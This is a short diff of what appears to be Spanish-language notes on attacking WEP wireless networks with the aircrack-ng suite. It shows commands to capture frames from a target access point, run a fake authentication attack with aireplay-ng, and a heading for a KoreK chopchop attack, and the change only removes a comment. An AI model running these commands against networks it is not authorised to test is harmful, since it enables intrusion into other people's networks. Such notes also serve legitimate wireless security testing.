@@ -75,7 +75,7 @@ airmon-ng check kill
 //Capturar tramas Wireless en un punto de acceso y canal específico
 airodump-ng -c 11 --bssid $bssid -w wep_clientes_open $wlan0
 
-//Ataque de autenticación falsa con reasociación  --AQUI devuelve si es OPN o SKA!!
+//Ataque de autenticación falsa con reasociación  
 aireplay-ng -1 60 -e $essid -a $bssid -h $wlan0_mac $wlan0
 
 //Ataque KoreK chopchop
